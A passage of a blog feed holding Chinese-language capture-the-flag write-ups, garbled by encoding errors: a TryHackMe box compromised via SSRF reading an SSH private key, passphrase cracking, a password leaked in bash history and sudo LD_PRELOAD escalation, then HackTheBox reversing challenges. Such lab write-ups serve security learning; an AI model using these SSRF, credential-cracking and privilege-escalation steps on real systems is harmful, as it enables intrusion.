Filter           : Response size: 13\n________________________________________________\n\n80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 365ms]\n1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 348ms]\n:: Progress: [2000/2000] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:18] :: Errors: 0 ::\n```\n\nå‘ç°å†…éƒ¨ç«¯å£`1337` ï¼Œç›´æ¥è®©æœåŠ¡å™¨è¿›è¡Œ`SSRF`\n\n![image.png](/post-images/TryHackMeCreative/image4.png)\n\næˆ‘ä»¬å†æ¢æˆ\n\n```bash\nhttp://127.0.0.1:1337/home\n```\n\n![image.png](/post-images/TryHackMeCreative/image5.png)\n\næˆ‘ä»¬ç›´æ¥è¯»å–ç§é’¥\n\n```bash\nhttp://127.0.0.1:1337/home/saad/.ssh/id_rsa\n```\n\n![image.png](/post-images/TryHackMeCreative/image6.png)\n\n## Crack\n\nç›´æ¥ç§é’¥ç™»å½•\n\n```bash\nâœ  Creative ssh saad@10.10.96.159 -i sshkey\nEnter passphrase for key 'sshkey': \n```\n\néœ€è¦å¯†ç ï¼Œçˆ†ç ´\n\n```bash\nâœ  Creative john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes\nCost 2 (iteration count) is 16 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsweetness        (sshkey)     \n1g 0:00:00:31 DONE (2025-07-05 22:40) 0.03192g/s 30.65p/s 30.65c/s 30.65C/s hawaii..sandy\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\næˆ‘ä»¬å†ç™»å½•\n\n![image.png](/post-images/TryHackMeCreative/image7.png)\n\nå½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹èƒ½è¯»å–åˆ°`user.txt`\n\n```bash\nsaad@ip-10-10-96-159:~$ cat user.txt \n9a1ce90a7653d74ab98630b47b8b4a84\n```\n\n## Root\n\nçœ‹åˆ°`gnupg` æ„Ÿè§‰æ˜¯è¦æ•´è¿™ä¸ª\n\n```bash\nsaad@ip-10-10-96-159:~$ ls -al\ntotal 52\ndrwxr-xr-x 7 saad saad 4096 Jan 21  2023 .\ndrwxr-xr-x 4 root root 4096 Jul  5 13:57 ..\n-rw------- 1 saad saad  362 Jan 21  2023 .bash_history\n-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc\ndrwx------ 2 saad saad 4096 Jan 20  2023 .cache\ndrwx------ 3 saad saad 4096 Jan 20  2023 .gnupg\ndrwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local\n-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile\ndrwx------ 3 saad saad 4096 Jan 20  2023 snap\ndrwx------ 2 saad saad 4096 Jan 21  2023 .ssh\n-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py\n-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful\n-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt\n```\n\nä½†æ˜¯å¹¶ä¸æ˜¯ï¼Œå› ä¸ºæ–‡ä»¶å¹¶ä¸è¶³å¤Ÿ\n\næˆ‘ä»¬åˆæ³¨æ„åˆ°`.bash_history` ç«Ÿç„¶æ²¡æœ‰è¢«é‡åˆå‘åˆ°`/dev/null`\n\n```bash\nsaad@ip-10-10-96-159:~$ cat .bash_history \nwhoami\npwd\nls -al\nls\ncd ..\nsudo -l\necho \"saad:MyStrongestPasswordYet$4291\" > creds.txt\nrm creds.txt\nsudo -l\nwhomai\nwhoami\npwd\nls -al\nsudo -l\nls -al\npwd\nwhoami\nmysql -u root -p\nnetstat -antlp\nmysql -u root\nsudo su\nssh root@192.169.155.104\nmysql -u user -p\nmysql -u db_user -p\nls -ld /var/lib/mysql\nls -al\ncat .bash_history \ncat .bash_logout \nnano .bashrc \nls -al\n```\n\nå¾—åˆ°å¯†ç  `MyStrongestPasswordYet$4291` ï¼Œå•¥çœ‹`sudo`æƒé™\n\n```bash\nsaad@ip-10-10-96-159:~$ sudo -l\nMatching Defaults entries for saad on ip-10-10-96-159:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD\n\nUser saad may run the following commands on ip-10-10-96-159:\n    (root) /usr/bin/ping\n```\n\nçœ‹åˆ°`env_keep+=LD_PRELOAD` ç»“æŸäº†\n\n- `LD_PRELOAD` å¯ä»¥åœ¨è¿è¡Œç¨‹åºå‰å¼ºè¡ŒåŠ è½½ä½ è‡ªå®šä¹‰çš„ `.so` å…±äº«åº“ã€‚\n- å¦‚æœè¿™ä¸ªåº“ä¸­å®ç°äº† `getuid()` æˆ–å…¶ä»–æ ‡å‡†å‡½æ•°ï¼Œå®ƒå°±å¯ä»¥è¢«ä¼˜å…ˆåŠ è½½ã€è¦†ç›–ã€‚\n- å½“ä½ ä»¥ `sudo` è¿è¡Œ `/bin/whoami`ï¼Œå°±ä¼šå…ˆåŠ è½½ä½ çš„åº“ï¼Œæ‰§è¡Œä½ æŒ‡å®šçš„æ¶æ„ä»£ç \n\n> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path\n> \n\n![image.png](/post-images/TryHackMeCreative/image8.png)\n\n`root.txt`\n\n```bash\nroot@ip-10-10-96-159:~# cat root.txt \n992bfd94b90da48634aed182aae7b99f\n```\n\n## æ€»ç»“\n\næ¢­å“ˆ",
            "url": "https://www.sunsetaction.top/2025/07/05/TryHackMeCreative",
            "title": "TryHackMe - Creative",
            "summary": "Creative https://tryhackme.com/room/creative | Easy infoï¼šExploit a vulnerable web application and some misconfigurations to gain root privileges. Reco...",
            "date_modified": "2025-07-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TryHackMe",
                "Linux",
                "SSRF",
                "SUDO"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer",
            "content_html": "\n# Machine - Developer\n\n> https://app.hackthebox.com/machines/Developer | `Linux`Â |Â `Hard`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image.png)\n\n## Recon\n\n```bash\nâœ  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST \nNmap scan report for 10.10.11.103\nHost is up (0.092s latency).\nNot shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 110.48 seconds\n```\n\n```bash\nâœ  Developer nmap -sT -A -p 22,80 10.10.11.103       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST\nNmap scan report for 10.10.11.103\nHost is up (0.23s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)\n|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)\n|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://developer.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   99.02 ms 10.10.16.1\n2   99.78 ms 10.10.11.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.70 seconds\n```\n\nè®¿é—® `HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image1.png)\n\nå¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· `sunset` ï¼Œåˆ›å»ºå®Œæ¯•åä¼šç›´æ¥è¿›å…¥åå°\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image2.png)\n\né‡Œé¢ä¼šæœ‰ä¸€äº›CTFé¢˜ï¼Ÿè®©ä½ åšï¼Ÿ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image3.png)\n\n## CTF\n\n### PES\n\n é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ª`EXE`æ–‡ä»¶åˆä¸€ä¸²åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼š`X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC`\n\nå¯¹ç¨‹åºè¿›è¡Œåç¼–è¯‘ï¼Œåœ¨`PS2EXE`ä¸­çš„`Main`ä¸­èƒ½æ‰¾åˆ°ä¸€ä¸²`base64`ç¼–ç åçš„å­—ç¬¦ä¸²\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image4.png)\n\nè§£ç åæ˜¯åŠ å¯†çš„é€»è¾‘ï¼Œé€šè¿‡`AI`å†™å‡ºè§£å¯†è„šæœ¬å³å¯\n\n```bash\n# ===================================================================\n# Decryption Script for FullCrypto\n# We are reversing the logic from the original Encrypt-String function\n# ===================================================================\n\n# åŠ è½½å¿…è¦çš„ç¨‹åºé›†\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Security\")\nAdd-Type -AssemblyName System.Security\n\nfunction Decrypt-String($base64String) {\n    # --- è¿™äº›æ˜¯æˆ‘ä»¬åœ¨åŸè„šæœ¬ä¸­æ‰¾åˆ°çš„ç¡¬ç¼–ç ç§˜å¯† ---\n    $Passphrase = \"AmazinglyStrongPassword\"\n    $salt       = \"CrazilySimpleSalt\"\n    $init       = \"StupidlyEasy_IV\"\n    # ----------------------------------------------\n\n    # 1. å‡†å¤‡ Rijndael (AES) å¯¹è±¡\n    $r = New-Object System.Security.Cryptography.RijndaelManaged\n\n    # 2. å‡†å¤‡å¯†ç å’Œç›å€¼çš„å­—èŠ‚æ•°ç»„ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)\n    $passBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)\n    $saltBytes = [System.Text.Encoding]::UTF8.GetBytes($salt)\n\n    # 3. ç”Ÿæˆå¯†é’¥ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)\n    # ä½¿ç”¨ PasswordDeriveBytes, SHA1, 5æ¬¡è¿­ä»£, ç”Ÿæˆ32å­—èŠ‚å¯†é’¥\n    $r.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes $passBytes, $saltBytes, \"SHA1\", 5).GetBytes(32)\n\n    # 4. ç”Ÿæˆ IV (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)\n    # è®¡ç®— IV ç§å­çš„ SHA1 å“ˆå¸Œï¼Œå¹¶å–å‰16ä¸ªå­—èŠ‚\n    $r.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($init))[0..15]\n\n    # 5. ä» Base64 å­—ç¬¦ä¸²è§£ç å‡ºåŠ å¯†åçš„å­—èŠ‚æ•°ç»„\n    try {\n        $encryptedBytes = [System.Convert]::FromBase64String($base64String)\n    } catch {\n        Write-Error \"Invalid Base64 string. Cannot decrypt.\"\n        return\n    }\n\n    # 6. åˆ›å»ºè§£å¯†å™¨å¹¶æ‰§è¡Œè§£å¯†\n    $c = $r.CreateDecryptor()\n    $ms = New-Object System.IO.MemoryStream @(,$encryptedBytes)\n    $cs = New-Object System.Security.Cryptography.CryptoStream $ms, $c, \"Read\"\n    $sr = New-Object System.IO.StreamReader $cs\n\n    # 7. è¯»å–è§£å¯†åçš„æ˜æ–‡\n    $decryptedString = $sr.ReadToEnd()\n\n    # 8. æ¸…ç†èµ„æºå¹¶è¿”å›ç»“æœ\n    $sr.Close()\n    $cs.Close()\n    $ms.Close()\n    $r.Clear()\n\n    return $decryptedString\n}\n\n# --- ä½¿ç”¨æ–¹æ³• ---\n# å°†ä½ åœ¨æŒ‘æˆ˜ä¸­å¾—åˆ°çš„åŠ å¯†å­—ç¬¦ä¸²æ›¿æ¢åˆ°ä¸‹é¢çš„å˜é‡ä¸­\n$encryptedData = \"è¿™é‡Œæ”¾ä½ è¦è§£å¯†çš„Base64å­—ç¬¦ä¸²\"\n\n# è°ƒç”¨è§£å¯†å‡½æ•°\n$decryptedResult = Decrypt-String -base64String $encryptedData\n\n# è¾“å‡ºè§£å¯†ç»“æœ\nWrite-Host \"Decryption Result:\" -ForegroundColor Green\nWrite-Host $decryptedResult\n\n```\n\n```bash\nPS D:\\System\\Downloads\\20250620> .\\pass.ps1\nDecryption Result:\nDHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}\n```\n\n### Phished List\n\nç»™ä¸€ä¸ª`xlsx`æ–‡ä»¶ï¼Œå¬è¯´æ–‡æ¡£ä¸­åŒ…å«å¯†ç \n\nåƒæ˜¯éšå†™é¢˜ï¼Œä¸Šç½‘æœç´¢äº†ä¸‹ï¼Œ`docs`å’Œ`xlsx`åŸºæœ¬ä¸Šå°±æ˜¯`zip`æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œè§£å‹\n\nç„¶åæ‰¾åˆ° `phished_credentials\\xl\\worksheets\\sheet1.xml` ,åœ¨æœ€åº•ä¸‹èƒ½æ‰¾åˆ°\n\n```bash\n<sheetProtection \nalgorithmName=\"SHA-512\" \nhashValue=\"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==\" \nsaltValue=\"EoiHQklf0FagPs+iW0OzkA==\" \nspinCount=\"100000\" \nsheet=\"1\" \nobjects=\"1\" \nscenarios=\"1\"/>\n```\n\næˆ‘ä»¬å°† `sheet1.xml` çš„`sheetProtection` å—åˆ æ‰åï¼Œå†æ”¾è¿›å»æ›¿æ¢æ‰åŸæœ¬çš„ `sheet1.xml` å³å¯\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image5.png)\n\n```bash\nDHTB{H1dD3N_C0LuMn5_FtW}\n```\n\n### Lucky Guess\n\nå‹ç¼©åŒ…è§£å‹åæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥`IDA`æ‰“å¼€\n\n`winner`å‡½æ•°\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image6.png)\n\n`AI`ç¼–å†™å¼‚æˆ–è„šæœ¬\n\n```bash\n# C ä»£ç ä¸­çš„å˜é‡\nkey = \"98hKjr3f8CgfF\"\nciphertext = \"^w!%-%z2p7/# uw?\"\n\n# ç”¨äºå­˜æ”¾è§£å¯†ç»“æœçš„å˜é‡\nplaintext = \"\"\n\n# éå†å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦\nfor i in range(len(ciphertext)):\n    # 1. å–å‡ºå¯†æ–‡å­—ç¬¦å’Œå¯¹åº”çš„å¯†é’¥å­—ç¬¦\n    #    ä½¿ç”¨æ¨¡è¿ç®— (%) æ¥å®ç°å¯†é’¥çš„å¾ªç¯ä½¿ç”¨\n    cipher_char = ciphertext[i]\n    key_char = key[i % len(key)]\n    \n    # 2. è¿›è¡Œå¼‚æˆ– (XOR) è¿ç®—\n    #    ord() è·å–å­—ç¬¦çš„ASCIIç ï¼Œ^ æ˜¯å¼‚æˆ–æ“ä½œç¬¦\n    decrypted_char_code = ord(cipher_char) ^ ord(key_char)\n    \n    # 3. åº”ç”¨ç‰¹æ®Šå¤„ç†è§„åˆ™\n    if decrypted_char_code <= 31:\n        decrypted_char_code += 32\n        \n    # 4. å°†è§£å¯†åçš„ASCIIç è½¬æ¢å›å­—ç¬¦ï¼Œå¹¶æ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­\n    #    chr() å°†ASCIIç è½¬ä¸ºå­—ç¬¦\n    plaintext += chr(decrypted_char_code)\n\n# æŒ‰ç…§æ ¼å¼è¾“å‡ºæœ€ç»ˆçš„ Flag\nflag = f\"DHTB{{{plaintext}}}\"\nprint(flag)\n```\n\n```bash\nâœ  Developer python getpass.py                                              \nDHTB{gOInGWITHtHEfLOW}\n```\n\n### Authenication\n\nI developed a new authentication mechanism using rust. Can you reverse my password?\n\n`rust` é€†å‘\n\n```bash\nâœ  Developer ./authenticate                                    \nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nsdadad\nYou are unauthorized to use this application!\nâœ  Developer file authenticate \nauthenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped\n```\n\nè¿›å»è¦ä½ è¾“å…¥å¯†ç ç„¶åéªŒè¯ï¼Œ`IDA`æ‰“å¼€ï¼Œæ‰¾åˆ°éªŒè¯çš„éƒ¨åˆ†\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image7.png)\n\nå…¶ä¸­çš„è¿™è¡Œä»£ç æ­£åœ¨æ‰§è¡ŒÂ `v3 == v5`Â çš„æ¯”è¾ƒï¼Œå¹¶æŠŠç»“æœï¼ˆ`true`Â æˆ–Â `false`ï¼‰å­˜èµ·æ¥\n\n```bash\nHIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::eq::h372d5aaf05c06316(\n                                 &v3,\n                                 &v5);\n```\n\nå…¶ä¸­ä¸€ä¸ªåº”è¯¥æ˜¯ç”¨æˆ·è¾“å…¥çš„ï¼Œç„¶åå’Œ`v3` æˆ–è€… `v5` å»æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨`v3`æˆ–è€…`v5` å¤„æ–­ç‚¹ï¼Œå°±å¯ä»¥çœ‹åˆ°æ˜¯å’Œä»€ä¹ˆåœ¨å¯¹æ¯”\n\n```bash\nâœ  Developer pwndbg authenticate \nReading symbols from authenticate...\npwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.\npwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.\n------- tip of the day (disable with set show-tips off) -------\nIf you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on\npwndbg> info functions\n...\n0x0000000000008e30  main::validate\n0x00000000000090f0  main::authenticated                                                                           \n0x0000000000009130  main::check_password                                                                          \n0x0000000000009240  main::main                 \n0x0000000000009360  main   \n...\npwndbg> disassemble 0x0000000000009130\n...\n   0x00000000000091af <+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   \n   0x00000000000091b4 <+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   \n   0x00000000000091b9 <+137>:   lea    rdi,[rsp+0x38]\n   0x00000000000091be <+142>:   lea    rsi,[rsp+0x58]\n   0x00000000000091c3 <+147>:   call   0x7a80 <_ZN4core3cmp5impls69_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$2eq17h372d5aaf05c06316E>\n   0x00000000000091c8 <+152>:   mov    BYTE PTR [rsp+0x7],al                                                      \n   0x00000000000091cc <+156>:   jmp    0x91ce <_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  \n   0x00000000000091ce <+158>:   lea    rdi,[rsp+0x40]  \n   0x00000000000091d3 <+163>:   call   0x9db0 <_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   \n   0x00000000000091d8 <+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      \n   0x00000000000091dc <+172>:   test   al,0x1 \n...\n```\n\n`0x00000000000091c3` æ˜¯æˆ‘ä»¬æƒ³è¦æ–­ç‚¹çš„åœ°æ–¹ï¼Œä½†æ˜¯å¯èƒ½æœ‰`ALSR` ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ–­ç‚¹\n\n```bash\npwndbg> b main\nBreakpoint 1 at 0x9360\npwndbg> r\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n â–º 0x55555555d360 <main>                                                                                          push   rax\n   0x55555555d361 <main+1>                                                                                        movsxd rax, edi                 RAX => 1\n   0x55555555d364 <main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) â—‚â€” sub rsp, 0xb8\n   0x55555555d36b <main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] <= 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” '/root/Desktop/HackTheBox/Developer/authenticate'\n   0x55555555d36f <main+15>                                                                                       mov    rsi, rax                 RSI => 1\n   0x55555555d372 <main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” '/root/Desktop/HackTheBox/Developer/authenticate'\n   0x55555555d376 <main+22>                                                                                       call   std::rt::lang_start         <std::rt::lang_start>\n \n   0x55555555d37b <main+27>                                                                                       pop    rcx\n   0x55555555d37c <main+28>                                                                                       ret    \n \n   0x55555555d37d                                                                                                 nop    dword ptr [rax]\n   0x55555555d380 <<alloc::vec::Vec<T> as alloc::vec::SpecExtend<&T,core::slice::iter::Iter<T>>>::spec_extend>    sub    rsp, 0x28\n```\n\nèƒ½çœ‹åˆ°åœ°å€éƒ½å˜æˆäº†`0x55555555dxxx`\n\n```bash\n0x555555554000 + 0x91c3 = 0x55555555d1c3\n```\n\nç„¶åå†åœ¨`0x55555555d1c3`å¤„æ–­ç‚¹\n\n```bash\npwndbg> b *0x55555555d1c3\nBreakpoint 2 at 0x55555555d1c3\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nwhatï¼ˆéšä¾¿è¾“å…¥ï¼‰\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image8.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image9.png)\n\nå¯ä»¥çœ‹åˆ° `what`æ˜¯å’Œ`DHTB{rusty_bu5in3s5}` åœ¨æ¯”è¾ƒ\n\n```bash\nâœ  Developer ./authenticate\nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nDHTB{rusty_bu5in3s5}\nYou have successfully authenticated!\n```\n\n```bash\nDHTB{rusty_bu5in3s5}\n```\n\n### RevMe\n\nç›´æ¥å°±èƒ½æ‹¿åˆ° `flag`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image10.png)\n\n```bash\nDHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}\n```\n\n### PwnMe\n\n`PWN`é¢˜ç›®ï¼Œchecksecï¼Œ`NX`å’Œ`PIE`éƒ½å¼€äº†\n\n```bash\nâœ  Developer checksec pwnme  \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Developer/pwnme'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    Stripped:   No\n```\n\nä½†æ˜¯è²Œä¼¼å¹¶ä¸ç”¨çœ‹è¿™ä¸ªï¼Œä¹Ÿåƒæ˜¯é€†å‘é¢˜ç›®ï¼Œä¸‹è¾¹æ˜¯`main`å‡½æ•°\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char *v3; // rax\n  char s[8]; // [rsp+10h] [rbp-20h] BYREF\n  __int64 v6; // [rsp+18h] [rbp-18h]\n  int v7; // [rsp+20h] [rbp-10h]\n  char *v8; // [rsp+28h] [rbp-8h]\n\n  if ( argc > 1 )\n  {\n    if ( (unsigned int)check_password(argv[1], argv, envp) )\n    {\n      puts(\"Password correct. Here's a flag:\");\n      *(_QWORD *)s = 0xC384B2CB92A49894LL;\n      v6 = 0x8796C283C680B381LL;\n      v7 = 13486015;\n      v8 = s;\n      while ( *v8 )\n      {\n        v3 = v8++;\n        *v3 -= 80;\n      }\n      puts(s);\n    }\n    else\n    {\n      puts(\"Wrong password.\");\n    }\n  }\n  else\n  {\n    puts(\"Please enter your password as a program argument!\");\n  }\n  return 0;\n}\n```\n\nä¸»è¦åŠæ—¶è¦çœ‹`check_password`\n\n```bash\n__int64 __fastcall check_password(const char *a1)\n{\n  char *v1; // rax\n  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF\n  char s2[16]; // [rsp+20h] [rbp-30h] BYREF\n  char dest[16]; // [rsp+30h] [rbp-20h] BYREF\n  char *v6; // [rsp+40h] [rbp-10h]\n  unsigned int v7; // [rsp+4Ch] [rbp-4h]\n\n  v7 = 0;\n  strcpy(v3, \"é—¨èµ–æ—…æƒ«æ€ç·\");\n  v6 = v3;\n  while ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n  strcpy(dest, a1);\n  strcpy(s2, v3);\n  if ( !strcmp(dest, s2) )\n    return 1;\n  return v7;\n}\n```\n\n`a1`æ˜¯æˆ‘ä»¬çš„é”®å…¥çš„å‚æ•°ï¼Œä¸»è¦çš„è§£å¯†é€»è¾‘æ˜¯åœ¨ï¼š\n\n```bash\n  while ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n```\n\nç¨‹åºéå†è¿™ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼ˆ`v3`ï¼‰çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚çš„å€¼å‡å» `80`\n\nä½†æ˜¯æœ€åè¿˜æ˜¯ä¼šåœ¨`if ( !strcmp(dest, s2) )` å¤„è¿›è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬è¿˜æ˜¯åœ¨é‚£æ–­ç‚¹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å¯„å­˜å™¨çš„å€¼\n\næˆ‘ä»¬è¦åœ¨`0x00000000000011de` å¤„æ–­ç‚¹\n\n```bash\n0x00000000000011d8 <+131>:   mov    rsi,rdx\n0x00000000000011db <+134>:   mov    rdi,rax\n0x00000000000011de <+137>:   call   0x1050 <strcmp@plt>\n0x00000000000011e3 <+142>:   test   eax,eax\n```\n\nå’Œä¹‹å‰ä¸€æ ·ï¼Œå› ä¸ºæœ‰`ALSR`ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨`main`å¤„æ–­ç‚¹\n\n```bash\n â–º 0x5555555551f7 <main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)\n   0x5555555551fb <main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] <= 1\n   0x5555555551fe <main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] <= 0x7fffffffe078 â€”â–¸ 0x7fffffffe372 â—‚â€” '/root/Desktop/HackTheBox/Developer/pwnme'\n   0x555555555202 <main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]\n   0x555555555206 <main+19>   âœ˜ jg     main+38                     <main+38>\n \n   0x555555555208 <main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 â—‚â€” 'Please 